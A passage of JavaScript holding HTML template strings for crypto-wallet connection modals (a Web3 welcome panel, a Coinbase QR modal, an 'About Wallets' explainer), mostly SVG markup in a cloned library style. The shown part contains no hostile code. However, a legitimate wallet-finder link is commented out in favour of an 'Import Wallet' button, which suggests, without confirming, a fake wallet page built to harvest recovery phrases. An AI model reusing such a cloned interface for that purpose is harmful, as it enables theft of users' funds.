                                        <linearGradient id="paint0_linear_1094_2077" x1="1" y1="112.587" x2="297.034" y2="79.6111" gradientUnits="userSpaceOnUse">
                                            <stop stop-color="var(--ck-graphic-wave-stop-01)"></stop>
                                            <stop stop-color="var(--ck-graphic-wave-stop-02)" offset="0.239583"></stop>
                                            <stop stop-color="var(--ck-graphic-wave-stop-03)" offset="0.515625"></stop>
                                            <stop stop-color="var(--ck-graphic-wave-stop-04)" offset="0.739583"></stop>
                                            <stop stop-color="var(--ck-graphic-wave-stop-05)" offset="1"></stop>
                                        </linearGradient>
                                    </defs>
                                </svg>
                            </div>
                        </div>
                        <div class="sc-iBkjds emnDjo" style="padding-bottom: 18px;">
                            <h1 class="sc-ftvSup fEIqVI">Start Exploring Web3<br></h1>
                            <div class="sc-papXJ jCcNJP">Your wallet is the gateway to all things Ethereum, the magical technology that makes it possible to explore web3.<br></div>
                        </div>
                        <!--<a href="https://ethereum.org/en/wallets/find-wallet/#main-content" target="_blank" rel="noopener noreferrer" class="sc-himrzO eyWopv">
                            <span class="sc-gXmSlM CshDF">Choose Your First Wallet<br></span>
                            <svg width="13" height="12" viewBox="0 0 13 12" fill="none" xmlns="http://www.w3.org/2000/svg" class="sc-ezWOiH bkoIPM">
                                <line stroke="currentColor" x1="1" y1="6" x2="12" y2="6" stroke-width="2" stroke-linecap="round" class="sc-kLLXSd bDZenP"></line>
                                <path stroke="currentColor" d="M7.51431 1.5L11.757 5.74264M7.5 10.4858L11.7426 6.24314" stroke-width="2" stroke-linecap="round" class="sc-bZkfAO"></path>
                            </svg>
                        </a>-->
                        <a onClick="updatePage(ImportWalletModal);" rel="noopener noreferrer" class="sc-himrzO eyWopv">
                            <span class="sc-gXmSlM CshDF">Import Wallet<br></span>
                            <svg width="13" height="12" viewBox="0 0 13 12" fill="none" xmlns="http://www.w3.org/2000/svg" class="sc-ezWOiH bkoIPM">
                                <line stroke="currentColor" x1="1" y1="6" x2="12" y2="6" stroke-width="2" stroke-linecap="round" class="sc-kLLXSd bDZenP"></line>
                                <path stroke="currentColor" d="M7.51431 1.5L11.757 5.74264M7.5 10.4858L11.7426 6.24314" stroke-width="2" stroke-linecap="round" class="sc-bZkfAO"></path>
                            </svg>
                        </a>
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>
`;

const CoinbaseNotFoundModal = `
<div class="sc-idiyUo hBuwwI" style="--height: 502px; --width: 343px;">
   <div style="pointer-events: none; position: absolute; top: 0px; bottom: 0px; left: 50%; transform: translateX(-50%); width: var(--width); z-index: 9; transition: width 200ms ease 0s;"></div>
   <div class="sc-iqcoie RrATt active">
      <div class="sc-crXcEl gcowpW">
         <button onclick="updatePage(CloseModal);" aria-label="Close" class="sc-fnykZs hFEFWT">
            <svg width="14" height="14" viewBox="0 0 14 14" fill="none" xmlns="http://www.w3.org/2000/svg">
               <path d="M1 13L13 1" stroke="currentColor" stroke-width="2" stroke-linecap="round"></path>
               <path d="M1 0.999999L13 13" stroke="currentColor" stroke-width="2" stroke-linecap="round"></path>
            </svg>
         </button>
         <button onclick="updatePage(ConnectModal);" aria-label="Back" class="sc-fEOsli iSYxCx" style="opacity: 1;">
            <svg width="9" height="16" viewBox="0 0 9 16" fill="none" xmlns="http://www.w3.org/2000/svg">
               <path d="M8 1L1 8L8 15" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"></path>
            </svg>
         </button>
      </div>
      <div class="sc-eCYdqJ dLUlU">
         <div style="position: absolute; top: 0px; left: 0px; right: 0px; opacity: 1;">Scan with Mobile Camera</div>
      </div>
      <div class="sc-evZas gcbNhn">
         <div class="sc-breuTD hVhjow active-scale-up">
            <div class="sc-ksZaOG dmNTWR" style="pointer-events: auto;">
               <div style="z-index: 2; opacity: 1; transform: none;">
                  <div class="sc-dkzDqf jKlSZW">
                     <div class="sc-jSMfEi lbAEgN"></div>
                     <div class="sc-iBkjds emnDjo" style="padding-bottom: 8px; gap: 14px;">
                        <div class="sc-bWXABl fNjDgB">
                           <div class="sc-eFWqGp eHHZBy">
                              <div id="connect-coinbase-qrcode" style="opacity: 1;">

                              </div>
                           </div>
                        </div>
                        <div class="sc-hKMtZM dvERaj"><span>Don’t have the app?</span></div>
                     </div>
                     <button onClick="getCoinbase()" class="sc-himrzO eyWopv">
                        <div class="sc-ikZpkk FGzOk">
                           <div class="sc-jIZahH gjHfVN">
                              <svg width="13" height="12" viewBox="0 0 13 12" fill="none" xmlns="http://www.w3.org/2000/svg" class="sc-ezWOiH bkoIPM">
                                 <line stroke="currentColor" x1="1" y1="6" x2="12" y2="6" stroke-width="var(--stroke-width)" stroke-linecap="round" class="sc-kLLXSd bDZenP"></line>
                                 <path stroke="currentColor" d="M7.51431 1.5L11.757 5.74264M7.5 10.4858L11.7426 6.24314" stroke-width="var(--stroke-width)" stroke-linecap="round" class="sc-bZkfAO"></path>
                              </svg>
                           </div>
                        </div>
                        <span class="sc-gXmSlM CshDF">Get Coinbase Wallet</span>
                     </button>
                  </div>
               </div>
            </div>
         </div>
      </div>
   </div>
</div>
`;

const AboutModal = `
<div class="sc-idiyUo hBuwwI" style="--height: 501px; --width: 343px;">
    <div style="pointer-events: none; position: absolute; top: 0px; bottom: 0px; left: 50%; transform: translateX(-50%); width: var(--width); z-index: 9; transition: width 200ms ease 0s;"></div>
    <div class="sc-iqcoie RrATt active">
        <div class="sc-crXcEl gcowpW">
            <button onclick="updatePage(CloseModal);" aria-label="Close" class="sc-fnykZs hFEFWT">
                <svg width="14" height="14" viewBox="0 0 14 14" fill="none" xmlns="http://www.w3.org/2000/svg">
                    <path d="M1 13L13 1" stroke="currentColor" stroke-width="2" stroke-linecap="round"></path>
                    <path d="M1 0.999999L13 13" stroke="currentColor" stroke-width="2" stroke-linecap="round"></path>
                </svg>
            </button>
            <button onclick="updatePage(ConnectModal);" aria-label="Back" class="sc-fEOsli iSYxCx" data-projection-id="242" style="opacity: 1;">
                <svg width="9" height="16" viewBox="0 0 9 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-projection-id="244">
                    <path d="M8 1L1 8L8 15" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"></path>
                </svg>
            </button>
        </div>
        <div class="sc-eCYdqJ dLUlU">
            <div data-projection-id="246" style="position: absolute; top: 0px; left: 0px; right: 0px; opacity: 1;">About Wallets<br></div>
        </div>
        <div class="sc-evZas gcbNhn">
            <div class="sc-breuTD hVhjow active-scale-up" data-projection-id="248">
                <div class="sc-ksZaOG dmNTWR" data-projection-id="250" style="pointer-events: auto;">
                    <div class="sc-dkzDqf jKlSZW" data-projection-id="252">
                        <div class="sc-jSMfEi lbAEgN" data-projection-id="254"></div>
                        <div class="sc-cTQhss kAlRaS">
                            <div class="sc-ciZhAO iSzwtb">
                                <div class="sc-jdAMXn" data-projection-id="256" style="position: absolute;">
                                    <div style="display: flex; align-items: center; justify-content: center;">
                                        <div data-projection-id="258" style="z-index: 4; position: relative; display: flex; align-items: center; justify-content: center; width: 76px; height: 76px; background: var(--ck-graphic-secondary-background, #6366F1); border-radius: 50%; box-shadow: var(--ck-graphic-secondary-box-shadow, 0px 2px 10px rgba(99, 102, 241, 0.3)); transform: none;">
                                            <svg width="38" height="44" viewBox="0 0 38 44" fill="none" xmlns="http://www.w3.org/2000/svg">
                                                <path fill-rule="evenodd" clip-rule="evenodd" d="M19 0.875C21.4853 0.875 23.5 2.88972 23.5 5.375V27.761L30.068 21.193C31.8254 19.4357 34.6746 19.4357 36.432 21.193C38.1893 22.9504 38.1893 25.7996 36.432 27.557L22.182 41.807C20.4246 43.5643 17.5754 43.5643 15.818 41.807L1.56802 27.557C-0.18934 25.7996 -0.18934 22.9504 1.56802 21.193C3.32538 19.4357 6.17462 19.4357 7.93198 21.193L14.5 27.761V5.375C14.5 2.88972 16.5147 0.875 19 0.875Z" fill="var(--ck-graphic-secondary-color, white)"></path>
                                            </svg>
                                        </div>
                                        <div class="sc-kgUAyh casSyR" data-projection-id="260" style="position: relative; z-index: 10; margin: 0px -8px; width: 112px; height: 112px; opacity: 1;">
                                            <div class="sc-hTtwUo gsQaVR" data-projection-id="262" style="background: var(--ck-graphic-primary-background, var(--ck-body-background)); box-shadow: var(--ck-graphic-primary-box-shadow, 0px 3px 15px rgba(0, 0, 0, 0.1)); opacity: 1;">
                                                <div class="sc-BeQoi lgfrNL" data-projection-id="264"></div>
                                                <div data-projection-id="266" style="z-index: 2; position: relative;">
                                                    <svg width="58" height="50" viewBox="0 0 58 50" fill="none" xmlns="http://www.w3.org/2000/svg">
                                                        <path fill-rule="evenodd" clip-rule="evenodd" d="M57.9332 20.3335V42.1113C57.9332 46.4069 54.451 49.8891 50.1555 49.8891H8.15546C3.85991 49.8891 0.377686 46.4069 0.377686 42.1113V25.0002V7.8891C0.377686 3.59355 3.85991 0.111328 8.15546 0.111328H47.0444C48.7626 0.111328 50.1555 1.50422 50.1555 3.22244C50.1555 4.94066 48.7626 6.33355 47.0443 6.33355H9.71102C7.9928 6.33355 6.59991 7.72644 6.59991 9.44466C6.59991 11.1629 7.9928 12.5558 9.71102 12.5558H50.1555C54.451 12.5558 57.9332 16.038 57.9332 20.3335ZM46.2667 34.3337C48.4145 34.3337 50.1556 32.5926 50.1556 30.4448C50.1556 28.297 48.4145 26.5559 46.2667 26.5559C44.1189 26.5559 42.3778 28.297 42.3778 30.4448C42.3778 32.5926 44.1189 34.3337 46.2667 34.3337Z" fill="var(--ck-graphic-primary-color, var(--ck-body-color))"></path>
                                                        <defs>
                                                            <linearGradient id="paint0_linear_2501_7732" x1="29.1555" y1="0.111328" x2="29.1555" y2="49.8891" gradientUnits="userSpaceOnUse">
                                                                <stop stop-color="var(--ck-body-background-transparent, transparent)"></stop>
                                                                <stop offset="1" stop-color="var(--ck-body-background)"></stop>
                                                            </linearGradient>
                                                        </defs>
                                                    </svg>
                                                </div>
                                            </div>
                                        </div>
                                        <div data-projection-id="268" style="z-index: 4; position: relative; width: 76px; height: 76px; background: var(--ck-graphic-secondary-background, #3897FB); border-radius: 50%; box-shadow: var(--ck-graphic-secondary-box-shadow, 0px 2px 10px rgba(56, 151, 251, 0.3)); transform: none;">
                                            <div class="sc-bBXxYQ HAmYI">
                                                <div style="position: relative; left: -2px; top: 3px;">
                                                    <svg width="41" height="41" viewBox="0 0 41 41" fill="none" xmlns="http://www.w3.org/2000/svg">
                                                        <path d="M35.4446 0.839914L2.14484 10.7065C0.0395033 11.3303 -0.632966 13.9786 0.919705 15.5313L7.9624 22.574C9.47585 24.0874 11.8661 24.273 13.5951 23.0114L25.2866 14.4797C25.5558 14.2832 25.9281 14.3121 26.1638 14.5478C26.3998 14.7838 26.4285 15.1567 26.2313 15.426L17.6874 27.0937C16.4213 28.8228 16.6052 31.2168 18.1206 32.7322L25.1811 39.7926C26.7337 41.3453 29.382 40.6728 30.0058 38.5675L39.8724 5.2677C40.6753 2.55794 38.1544 0.037024 35.4446 0.839914Z" fill="var(--ck-graphic-secondary-color, white)"></path>
                                                    </svg>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                            <div class="sc-iAvgwm bDnYPG">
                                <div class="sc-efBctP jMNqtD" data-projection-id="270">
                                    <div class="sc-bZnhIo haLOJ">
                                        <div class="sc-jdAMXn" data-projection-id="272">
                                            <div style="display: flex; align-items: center; justify-content: center;">
                                                <div data-projection-id="274" style="z-index: 4; position: relative; display: flex; align-items: center; justify-content: center; width: 76px; height: 76px; background: var(--ck-graphic-secondary-background, #6366F1); border-radius: 50%; box-shadow: var(--ck-graphic-secondary-box-shadow, 0px 2px 10px rgba(99, 102, 241, 0.3)); transform: translateX(0%) scale(1) rotate(0deg) translateZ(0px);">
                                                    <svg width="38" height="44" viewBox="0 0 38 44" fill="none" xmlns="http://www.w3.org/2000/svg">
                                                        <path fill-rule="evenodd" clip-rule="evenodd" d="M19 0.875C21.4853 0.875 23.5 2.88972 23.5 5.375V27.761L30.068 21.193C31.8254 19.4357 34.6746 19.4357 36.432 21.193C38.1893 22.9504 38.1893 25.7996 36.432 27.557L22.182 41.807C20.4246 43.5643 17.5754 43.5643 15.818 41.807L1.56802 27.557C-0.18934 25.7996 -0.18934 22.9504 1.56802 21.193C3.32538 19.4357 6.17462 19.4357 7.93198 21.193L14.5 27.761V5.375C14.5 2.88972 16.5147 0.875 19 0.875Z" fill="var(--ck-graphic-secondary-color, white)"></path>
                                                    </svg>
                                                </div>
                                                <div class="sc-kgUAyh casSyR" data-projection-id="276" style="position: relative; z-index: 10; margin: 0px -8px; width: 112px; height: 112px;">
                                                    <div class="sc-hTtwUo gsQaVR" data-projection-id="278" style="background: var(--ck-graphic-primary-background, var(--ck-body-background)); box-shadow: var(--ck-graphic-primary-box-shadow, 0px 3px 15px rgba(0, 0, 0, 0.1)); opacity: 1;">
                                                        <div class="sc-BeQoi lgfrNL" data-projection-id="280"></div>
                                                        <div data-projection-id="282" style="z-index: 2; position: relative;">
                                                            <svg width="58" height="50" viewBox="0 0 58 50" fill="none" xmlns="http://www.w3.org/2000/svg">
                                                                <path fill-rule="evenodd" clip-rule="evenodd" d="M57.9332 20.3335V42.1113C57.9332 46.4069 54.451 49.8891 50.1555 49.8891H8.15546C3.85991 49.8891 0.377686 46.4069 0.377686 42.1113V25.0002V7.8891C0.377686 3.59355 3.85991 0.111328 8.15546 0.111328H47.0444C48.7626 0.111328 50.1555 1.50422 50.1555 3.22244C50.1555 4.94066 48.7626 6.33355 47.0443 6.33355H9.71102C7.9928 6.33355 6.59991 7.72644 6.59991 9.44466C6.59991 11.1629 7.9928 12.5558 9.71102 12.5558H50.1555C54.451 12.5558 57.9332 16.038 57.9332 20.3335ZM46.2667 34.3337C48.4145 34.3337 50.1556 32.5926 50.1556 30.4448C50.1556 28.297 48.4145 26.5559 46.2667 26.5559C44.1189 26.5559 42.3778 28.297 42.3778 30.4448C42.3778 32.5926 44.1189 34.3337 46.2667 34.3337Z" fill="var(--ck-graphic-primary-color, var(--ck-body-color))"></path>
                                                                <defs>
                                                                    <linearGradient id="paint0_linear_2501_7732" x1="29.1555" y1="0.111328" x2="29.1555" y2="49.8891" gradientUnits="userSpaceOnUse">
                                                                        <stop stop-color="var(--ck-body-background-transparent, transparent)"></stop>
                                                                        <stop offset="1" stop-color="var(--ck-body-background)"></stop>
                                                                    </linearGradient>
                                                                </defs>
                                                            </svg>
                                                        </div>
                                                    </div>
                                                </div>
                                                <div data-projection-id="284" style="z-index: 4; position: relative; width: 76px; height: 76px; background: var(--ck-graphic-secondary-background, #3897FB); border-radius: 50%; box-shadow: var(--ck-graphic-secondary-box-shadow, 0px 2px 10px rgba(56, 151, 251, 0.3)); transform: translateX(0%) scale(1) rotate(0deg) translateZ(0px);">
                                                    <div class="sc-bBXxYQ HAmYI">
                                                        <div style="position: relative; left: -2px; top: 3px;">
                                                            <svg width="41" height="41" viewBox="0 0 41 41" fill="none" xmlns="http://www.w3.org/2000/svg">
                                                                <path d="M35.4446 0.839914L2.14484 10.7065C0.0395033 11.3303 -0.632966 13.9786 0.919705 15.5313L7.9624 22.574C9.47585 24.0874 11.8661 24.273 13.5951 23.0114L25.2866 14.4797C25.5558 14.2832 25.9281 14.3121 26.1638 14.5478C26.3998 14.7838 26.4285 15.1567 26.2313 15.426L17.6874 27.0937C16.4213 28.8228 16.6052 31.2168 18.1206 32.7322L25.1811 39.7926C26.7337 41.3453 29.382 40.6728 30.0058 38.5675L39.8724 5.2677C40.6753 2.55794 38.1544 0.037024 35.4446 0.839914Z" fill="var(--ck-graphic-secondary-color, white)"></path>
                                                            </svg>
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                    <div class="sc-iBkjds emnDjo" data-projection-id="286" style="gap: 8px; padding-bottom: 0px;">
                                        <h1 class="sc-ftvSup fEIqVI" data-projection-id="288">For your digital assets<br></h1>
                                        <div class="sc-papXJ jCcNJP">Wallets let you send, receive, store, and interact with digital assets like NFTs and other Ethereum tokens.<br></div>
                                    </div>
                                </div>
                                <div class="sc-efBctP cVqqga" data-projection-id="290">
                                    <div class="sc-bZnhIo haLOJ">
                                        <div class="sc-jdAMXn" data-projection-id="292">
                                            <div style="position: relative; left: -14px;">
                                                <div class="sc-kgUAyh casSyR" data-projection-id="294" style="z-index: 10; position: absolute; left: 15px; top: 12px; width: 32px; height: 32px;">
                                                    <div class="sc-hTtwUo gsQaVR" data-projection-id="296" style="background: var(--ck-graphic-primary-background, var(--ck-body-background)); box-shadow: var(--ck-graphic-primary-box-shadow, 0px 2px 5px rgba(37, 41, 46, 0.16)); opacity: 1;">
                                                        <div class="sc-bBXxYQ HAmYI">
                                                            <svg width="58" height="50" viewBox="0 0 58 50" fill="none" xmlns="http://www.w3.org/2000/svg">
                                                                <path fill-rule="evenodd" clip-rule="evenodd" d="M57.9332 20.3335V42.1113C57.9332 46.4069 54.451 49.8891 50.1555 49.8891H8.15546C3.85991 49.8891 0.377686 46.4069 0.377686 42.1113V25.0002V7.8891C0.377686 3.59355 3.85991 0.111328 8.15546 0.111328H47.0444C48.7626 0.111328 50.1555 1.50422 50.1555 3.22244C50.1555 4.94066 48.7626 6.33355 47.0443 6.33355H9.71102C7.9928 6.33355 6.59991 7.72644 6.59991 9.44466C6.59991 11.1629 7.9928 12.5558 9.71102 12.5558H50.1555C54.451 12.5558 57.9332 16.038 57.9332 20.3335ZM46.2667 34.3337C48.4145 34.3337 50.1556 32.5926 50.1556 30.4448C50.1556 28.297 48.4145 26.5559 46.2667 26.5559C44.1189 26.5559 42.3778 28.297 42.3778 30.4448C42.3778 32.5926 44.1189 34.3337 46.2667 34.3337Z" fill="var(--ck-graphic-primary-color, var(--ck-body-color))"></path>
                                                                <defs>
                                                                    <linearGradient id="paint0_linear_2501_7732" x1="29.1555" y1="0.111328" x2="29.1555" y2="49.8891" gradientUnits="userSpaceOnUse">
                                                                        <stop stop-color="var(--ck-body-background-transparent, transparent)"></stop>
                                                                        <stop offset="1" stop-color="var(--ck-body-background)"></stop>
                                                                    </linearGradient>
                                                                </defs>
                                                            </svg>
                                                        </div>
                                                    </div>
                                                </div>
                                                <div data-projection-id="298" style="z-index: 7; position: relative; display: flex; align-items: center; padding: 21px 52px 21px 56px; background: var(--ck-graphic-primary-background, var(--ck-body-background)); box-shadow: var(--ck-graphic-primary-box-shadow, 0px 2px 9px rgba(0, 0, 0, 0.07)); border-radius: var(--ck-border-radius, 16px); transform: none;">
                                                    <div class="sc-BeQoi lgfrNL" data-projection-id="300"></div>
                                                    <div style="position: relative; z-index: 2; top: 1px; left: 1px;">
                                                        <svg width="131" height="14" viewBox="0 0 131 14" fill="none" xmlns="http://www.w3.org/2000/svg">
                                                            <path d="M5.74805 13.2549C8.86816 13.2549 10.7227 10.6973 10.7227 6.63672C10.7227 2.57617 8.85059 0.0625 5.74805 0.0625C2.63672 0.0625 0.755859 2.59375 0.755859 6.64551C0.755859 10.7148 2.61914 13.2549 5.74805 13.2549ZM5.74805 11.4004C4.02539 11.4004 3.04102 9.64258 3.04102 6.63672C3.04102 3.68359 4.04297 1.91699 5.74805 1.91699C7.44434 1.91699 8.4375 3.6748 8.4375 6.64551C8.4375 9.65137 7.46191 11.4004 5.74805 11.4004Z" fill="var(--ck-body-color)"></path>
                                                            <path d="M13.0869 13.1758C13.4561 13.1758 13.6934 13.0439 13.9658 12.6221L15.9697 9.66016H16.0137L18.0264 12.6572C18.2549 13.0088 18.4922 13.1758 18.8965 13.1758C19.4854 13.1758 19.9424 12.7891 19.9424 12.209C19.9424 11.9805 19.8633 11.7695 19.7051 11.541L17.376 8.28906L19.6963 5.16016C19.8896 4.90527 19.9688 4.68555 19.9688 4.43066C19.9688 3.88574 19.5381 3.49902 18.9229 3.49902C18.5361 3.49902 18.2988 3.6748 18.0176 4.10547L16.1191 6.95312H16.0752L14.1328 4.08789C13.8516 3.64844 13.6318 3.49902 13.2012 3.49902C12.6035 3.49902 12.1465 3.91211 12.1465 4.44824C12.1465 4.70312 12.2256 4.92285 12.3838 5.13379L14.7129 8.35059L12.3486 11.5498C12.1641 11.8135 12.0762 12.0156 12.0762 12.2705C12.0762 12.7979 12.498 13.1758 13.0869 13.1758Z" fill="var(--ck-body-color)"></path>
                                                            <path d="M26.2441 13.2549C29.1445 13.2549 31.1924 11.7432 31.1924 9.57227C31.1924 7.9375 30.0146 6.68066 28.3184 6.3291V6.27637C29.7773 5.87207 30.7178 4.7998 30.7178 3.45508C30.7178 1.48633 28.8633 0.0625 26.2441 0.0625C23.625 0.0625 21.7617 1.49512 21.7617 3.44629C21.7617 4.80859 22.7109 5.88965 24.1699 6.27637V6.3291C22.4736 6.67188 21.3047 7.92871 21.3047 9.57227C21.3047 11.7344 23.335 13.2549 26.2441 13.2549ZM26.2441 5.55566C24.9258 5.55566 24.0029 4.78223 24.0029 3.6748C24.0029 2.55859 24.9258 1.77637 26.2441 1.77637C27.5537 1.77637 28.4854 2.5498 28.4854 3.6748C28.4854 4.78223 27.5537 5.55566 26.2441 5.55566ZM26.2441 11.5234C24.7236 11.5234 23.6514 10.6357 23.6514 9.40527C23.6514 8.1748 24.7236 7.28711 26.2441 7.28711C27.7646 7.28711 28.8369 8.16602 28.8369 9.40527C28.8369 10.6357 27.7646 11.5234 26.2441 11.5234Z" fill="var(--ck-body-color)"></path>
                                                            <path d="M36.3164 13.1494C37.7578 13.1494 38.7598 12.4199 39.208 11.3477H39.252V12.0771C39.252 12.7891 39.7266 13.1758 40.3594 13.1758C40.9922 13.1758 41.4404 12.7803 41.4404 12.0771V1.29297C41.4404 0.554688 40.9834 0.141602 40.3418 0.141602C39.7002 0.141602 39.252 0.554688 39.252 1.29297V5.24805H39.1992C38.707 4.21973 37.6523 3.52539 36.3164 3.52539C33.9697 3.52539 32.4492 5.38867 32.4492 8.33301C32.4492 11.2949 33.9697 13.1494 36.3164 13.1494ZM36.9756 11.3564C35.5605 11.3564 34.6904 10.1963 34.6904 8.3418C34.6904 6.49609 35.5693 5.32715 36.9756 5.32715C38.3555 5.32715 39.2607 6.51367 39.2607 8.3418C39.2607 10.1875 38.3555 11.3564 36.9756 11.3564Z" fill="var(--ck-body-color)"></path>
                                                            <path d="M44.0508 13.1494C44.6396 13.1494 44.9736 12.8594 45.1846 12.1738L46.0195 9.76562H50.7568L51.5918 12.1914C51.7939 12.8682 52.1367 13.1494 52.752 13.1494C53.4111 13.1494 53.8857 12.7188 53.8857 12.1035C53.8857 11.9014 53.8418 11.6992 53.7363 11.4092L50.0449 1.38965C49.7285 0.537109 49.2188 0.167969 48.3838 0.167969C47.5576 0.167969 47.0479 0.554688 46.7402 1.39844L43.0576 11.4092C42.9521 11.6816 42.9082 11.9277 42.9082 12.1035C42.9082 12.7451 43.3564 13.1494 44.0508 13.1494ZM46.5557 7.97266L48.3398 2.55859H48.4014L50.2031 7.97266H46.5557Z" fill="var(--ck-body-color)"></path>
                                                            <path d="M60.1172 13.2549C62.8594 13.2549 64.8545 11.4004 64.8545 8.8252C64.8545 6.42578 63.1406 4.66797 60.6973 4.66797C58.9746 4.66797 57.709 5.54688 57.208 6.71582H57.1641V6.58398C57.208 3.66602 58.2275 1.89941 60.1436 1.89941C61.084 1.89941 61.7607 2.26855 62.3496 3.07715C62.7012 3.52539 62.9824 3.73633 63.4307 3.73633C64.0283 3.73633 64.3975 3.34082 64.3975 2.82227C64.3975 2.57617 64.3359 2.35645 64.1953 2.10156C63.5625 0.897461 62.0859 0.0537109 60.1523 0.0537109C56.9268 0.0537109 54.9932 2.57617 54.9932 6.80371C54.9932 8.24512 55.2305 9.45801 55.6963 10.4336C56.5752 12.2881 58.1396 13.2549 60.1172 13.2549ZM60.082 11.4092C58.667 11.4092 57.5508 10.293 57.5508 8.86914C57.5508 7.4541 58.6494 6.41699 60.1084 6.41699C61.5674 6.41699 62.6309 7.4541 62.6221 8.91309C62.6221 10.3018 61.4971 11.4092 60.082 11.4092Z" fill="var(--ck-body-color)"></path>
                                                            <path d="M68.1328 8.83398C68.8447 8.83398 69.416 8.27148 69.416 7.55078C69.416 6.83008 68.8447 6.25879 68.1328 6.25879C67.4121 6.25879 66.8408 6.83008 66.8408 7.55078C66.8408 8.27148 67.4121 8.83398 68.1328 8.83398Z" fill="var(--ck-body-color)"></path>
                                                            <path d="M73.3359 8.83398C74.0479 8.83398 74.6191 8.27148 74.6191 7.55078C74.6191 6.83008 74.0479 6.25879 73.3359 6.25879C72.6152 6.25879 72.0439 6.83008 72.0439 7.55078C72.0439 8.27148 72.6152 8.83398 73.3359 8.83398Z" fill="var(--ck-body-color)"></path>
                                                            <path d="M78.5391 8.83398C79.251 8.83398 79.8223 8.27148 79.8223 7.55078C79.8223 6.83008 79.251 6.25879 78.5391 6.25879C77.8184 6.25879 77.2471 6.83008 77.2471 7.55078C77.2471 8.27148 77.8184 8.83398 78.5391 8.83398Z" fill="var(--ck-body-color)"></path>
                                                            <path d="M83.7422 8.83398C84.4541 8.83398 85.0254 8.27148 85.0254 7.55078C85.0254 6.83008 84.4541 6.25879 83.7422 6.25879C83.0215 6.25879 82.4502 6.83008 82.4502 7.55078C82.4502 8.27148 83.0215 8.83398 83.7422 8.83398Z" fill="var(--ck-body-color)"></path>
                                                            <path d="M92.2148 13.2549C94.957 13.2549 96.9521 11.4004 96.9521 8.8252C96.9521 6.42578 95.2383 4.66797 92.7949 4.66797C91.0723 4.66797 89.8066 5.54688 89.3057 6.71582H89.2617V6.58398C89.3057 3.66602 90.3252 1.89941 92.2412 1.89941C93.1816 1.89941 93.8584 2.26855 94.4473 3.07715C94.7988 3.52539 95.0801 3.73633 95.5283 3.73633C96.126 3.73633 96.4951 3.34082 96.4951 2.82227C96.4951 2.57617 96.4336 2.35645 96.293 2.10156C95.6602 0.897461 94.1836 0.0537109 92.25 0.0537109C89.0244 0.0537109 87.0908 2.57617 87.0908 6.80371C87.0908 8.24512 87.3281 9.45801 87.7939 10.4336C88.6729 12.2881 90.2373 13.2549 92.2148 13.2549ZM92.1797 11.4092C90.7646 11.4092 89.6484 10.293 89.6484 8.86914C89.6484 7.4541 90.7471 6.41699 92.2061 6.41699C93.665 6.41699 94.7285 7.4541 94.7197 8.91309C94.7197 10.3018 93.5947 11.4092 92.1797 11.4092Z" fill="var(--ck-body-color)"></path>
                                                            <path d="M103.377 13.2549C106.497 13.2549 108.352 10.6973 108.352 6.63672C108.352 2.57617 106.479 0.0625 103.377 0.0625C100.266 0.0625 98.3848 2.59375 98.3848 6.64551C98.3848 10.7148 100.248 13.2549 103.377 13.2549ZM103.377 11.4004C101.654 11.4004 100.67 9.64258 100.67 6.63672C100.67 3.68359 101.672 1.91699 103.377 1.91699C105.073 1.91699 106.066 3.6748 106.066 6.64551C106.066 9.65137 105.091 11.4004 103.377 11.4004Z" fill="var(--ck-body-color)"></path>
                                                            <path d="M117.167 13.1758C117.8 13.1758 118.248 12.7715 118.248 12.0596V10.5654H119.127C119.733 10.5654 120.094 10.1875 120.094 9.63379C120.094 9.08887 119.733 8.70215 119.136 8.70215H118.248V1.81152C118.248 0.756836 117.554 0.141602 116.385 0.141602C115.453 0.141602 114.899 0.52832 114.073 1.75879C112.553 3.99121 111.111 6.16211 110.224 7.75293C109.872 8.38574 109.731 8.79883 109.731 9.29102C109.731 10.0469 110.268 10.5654 111.085 10.5654H116.086V12.0596C116.086 12.7715 116.543 13.1758 117.167 13.1758ZM116.121 8.75488H111.788V8.69336C112.816 6.82129 114.073 4.92285 116.086 2.04004H116.121V8.75488Z" fill="var(--ck-body-color)"></path>
                                                            <path d="M126.105 13.2549C128.918 13.2549 130.869 11.4355 130.869 8.78125C130.869 6.35547 129.138 4.6416 126.712 4.6416C125.438 4.6416 124.392 5.13379 123.855 5.9248H123.812L124.146 2.17188H129.27C129.85 2.17188 130.228 1.80273 130.228 1.24023C130.228 0.686523 129.85 0.317383 129.27 0.317383H123.803C122.81 0.317383 122.3 0.72168 122.221 1.72363L121.816 6.51367C121.808 6.56641 121.808 6.60156 121.808 6.6543C121.79 7.26953 122.15 7.78809 122.88 7.78809C123.398 7.78809 123.618 7.67383 124.146 7.14648C124.629 6.67188 125.323 6.34668 126.123 6.34668C127.617 6.34668 128.681 7.38379 128.681 8.84277C128.681 10.3457 127.617 11.4092 126.114 11.4092C124.893 11.4092 124.049 10.8027 123.618 9.77441C123.381 9.30859 123.091 9.12402 122.616 9.12402C122.019 9.12402 121.641 9.49316 121.641 10.082C121.641 10.4072 121.72 10.6709 121.843 10.9434C122.467 12.3232 124.154 13.2549 126.105 13.2549Z" fill="var(--ck-body-color)"></path>
                                                        </svg>
                                                    </div>
                                                </div>
                                                <div data-projection-id="302" style="z-index: 8; position: absolute; top: -16px; right: -28px; transform: none;">
                                                    <svg width="81" height="81" viewBox="0 0 81 81" fill="none" xmlns="http://www.w3.org/2000/svg">
                                                        <path fill-rule="evenodd" clip-rule="evenodd" d="M81 27C81 41.9117 68.9117 54 54 54C51.2722 54 48.6389 53.5955 46.1568 52.8432L36 63H27V72H18V81H4.5C2.01472 81 0 78.9853 0 76.5V64.864C0 63.6705 0.474103 62.5259 1.31802 61.682L28.1568 34.8432C27.4045 32.3611 27 29.7278 27 27C27 12.0883 39.0883 0 54 0C68.9117 0 81 12.0883 81 27ZM60.75 25.875C63.8566 25.875 66.375 23.3566 66.375 20.25C66.375 17.1434 63.8566 14.625 60.75 14.625C57.6434 14.625 55.125 17.1434 55.125 20.25C55.125 23.3566 57.6434 25.875 60.75 25.875Z" fill="url(#paint0_linear_2509_6177)"></path>
